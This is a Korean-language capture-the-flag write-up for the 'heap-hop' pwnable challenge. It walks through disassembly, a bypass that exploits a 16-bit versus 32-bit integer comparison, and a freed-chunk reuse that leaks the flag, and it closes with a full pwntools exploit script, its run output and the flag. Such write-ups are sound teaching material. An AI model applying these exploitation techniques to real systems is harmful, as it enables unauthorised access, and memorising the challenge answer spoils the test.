# heap-hop - Pwnable Challenge Solution

## 문제 정보
- **카테고리**: Pwnable
- **난이도**: ?
- **서버**: `nc pwn.runa2025.kr 7005`
- **힌트**: "난 슬플땐 힙합을 춰" (When I'm sad, I do hip-hop/heap-hop)

## 플래그
```
runa2025{JusT_come_outS1DE_fOr_ThE_nIGHT_}
```

## 풀이 과정

### 1. 초기 분석

바이너리 기본 정보:
```bash
$ file heap-hop
heap-hop: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec heap-hop
[보호 기법 분석]
```

문자열 분석으로 기본 기능 파악:
```bash
$ strings heap-hop
=  1. Add user           =
=  2. User info          =
=  3. Exit               =
./flag
secret_menu
```

### 2. 숨겨진 함수 발견

심볼 테이블 분석:
```bash
$ nm heap-hop | grep -E 'add|info|user|menu'
00000000004012ae T add_user
0000000000401276 T print_menu
0000000000401480 T secret_menu    # 숨겨진 함수 발견!
000000000040408c B user_cnt
00000000004013d1 T user_info
```

**핵심 발견**: 메뉴에는 없지만 `secret_menu` 함수가 존재하며, `./flag` 파일을 열어서 읽는 기능을 가지고 있음!

### 3. secret_menu 호출 조건 분석

main 함수 디스어셈블리:
```assembly
40160a:  cmp    $0x7a69,%eax     # 입력값과 0x7a69(31337) 비교
40160f:  jne    40162a           # 같지 않으면 점프
401611:  lea    0xaad(%rip),%rax # "no..." 문자열
40161b:  call   puts@plt         # "no..." 출력
401625:  jmp    401707           # 프로그램 종료

40162a:  mov    -0x4(%rbp),%eax
40162d:  movzwl %ax,%eax         # 하위 16비트만 추출!
401630:  cmp    $0x7a69,%eax     # 다시 31337과 비교
401635:  je     4016cf           # 같으면 secret_menu 호출!
...
4016cf:  lea    -0x60(%rbp),%rax
4016d3:  mov    %rax,%rdi
4016d6:  call   401480 <secret_menu>  # SECRET MENU 호출!
```

**핵심 로직**:
1. 첫 번째 비교: 32비트 전체가 정확히 31337이면 "no..." 출력 후 종료
2. 두 번째 비교: 하위 16비트만 31337이면 secret_menu 호출

**우회 방법**: 
- `0x7a69` = 31337
- `0x17a69` = 96873 = 0x10000 + 31337
- 96873을 입력하면 첫 번째 조건 우회, 두 번째 조건 만족!

### 4. secret_menu 함수 분석

```assembly
401480 <secret_menu>:
  # ./flag 파일 열기
  401491:  lea    0xc17(%rip),%rax  # "r" 모드
  40149b:  lea    0xc0f(%rip),%rax  # "./flag" 경로
  4014a5:  call   fopen@plt
  
  # user[user_cnt]에 0x42 바이트 할당
  4014ae:  mov    user_cnt,%eax
  4014c6:  mov    $0x42,%edi
  4014cb:  call   malloc@plt
  4014d0:  mov    %rax,(%rbx)       # user[user_cnt] = malloc(0x42)
  
  # name 필드에 "admin" 복사 (16바이트)
  4014f0:  mov    $0x10,%edx
  4014f5:  lea    0xbbc(%rip),%rax  # "admin" 문자열
  401502:  call   strncpy@plt
  
  # description 필드에 flag 파일 내용 읽기 (50바이트)
  401521:  lea    0x10(%rax),%rcx   # user + 0x10 (description 필드)
  40152c:  mov    $0x32,%esi        # 50 바이트
  401534:  call   fgets@plt
  
  # 파일 닫기
  401540:  call   fclose@plt
  
  # user[user_cnt] 해제 (UAF 취약점!)
  401562:  call   free@plt
```

**User 구조체**:
```c
struct User {
    char name[16];        // offset 0x00
    char description[50]; // offset 0x10
    // total: 0x42 bytes
};
```

**UAF (Use-After-Free) 취약점**:
- secret_menu는 user[user_cnt]에 메모리를 할당
- name에 "admin", description에 플래그 파일 내용을 읽음
- **중요**: 읽은 후 바로 `free()`를 호출하지만 user_cnt를 증가시키지 않음!
- 다음 add_user가 같은 크기(0x42)를 할당하면 **freed chunk를 재사용**
- 재사용된 청크에는 플래그 내용이 그대로 남아있음!

### 5. 익스플로잇 전략

1. **첫 번째 사용자 추가** (user0): user_cnt = 1
2. **96873 입력**으로 secret_menu 호출:
   - user[1]에 malloc(0x42)
   - name = "admin", description = flag 내용
   - user[1] free (하지만 user_cnt는 여전히 1)
3. **두 번째 사용자 추가** (admin): user_cnt = 2
   - malloc(0x42) 호출
   - 힙 allocator가 방금 freed된 user[1] 청크를 재사용
   - 새로운 name만 덮어쓰고, description은 그대로!
4. **user_info로 확인**:
   - user[0]: user0 정보
   - user[1]: admin + 플래그!

## 익스플로잇 코드

```python
#!/usr/bin/env python3
from pwn import *

# Connection
p = remote('pwn.runa2025.kr', 7005)

# Add first user
p.sendlineafter(b'>>', b'1')
p.sendlineafter(b': ', b'user0')
p.sendlineafter(b'>>', b'N')

# Call secret_menu with 96873 (0x10000 + 31337)
# This will allocate user[1], read flag into it, then free it
p.sendlineafter(b'>>', b'96873')

# Add second user - this will reuse the freed chunk from secret_menu
p.sendlineafter(b'>>', b'1')
p.sendlineafter(b': ', b'admin')
p.sendlineafter(b'>>', b'N')

# View user info - user[1] should contain the flag
p.sendlineafter(b'>>', b'2')

p.interactive()
```

## 실행 결과

```bash
$ python3 exploit.py
[+] Opening connection to pwn.runa2025.kr on port 7005: Done
[*] Switching to interactive mode
 == no.1
name : user0
description : 

== no.2
name : admin
description : runa2025{JusT_come_outS1DE_fOr_ThE_nIGHT_}
```

## 핵심 포인트

1. **숨겨진 기능 발견**: 심볼 테이블에서 secret_menu 함수 발견
2. **조건 우회**: 16비트 비교 vs 32비트 비교의 차이를 이용한 우회
3. **UAF 취약점**: free 후 재할당 시 이전 데이터가 남아있는 UAF 취약점 활용
4. **힙 재사용**: 같은 크기의 메모리 할당 시 freed chunk 재사용 특성 이용

## 배운 점

- 바이너리에 숨겨진 함수가 있을 수 있으므로 심볼 테이블 확인 필수
- 입력 검증 로직의 불일치(32비트 vs 16비트)를 활용한 우회 기법
- Use-After-Free 취약점의 기본 개념과 활용 방법
- 힙 메모리 재사용 메커니즘에 대한 이해
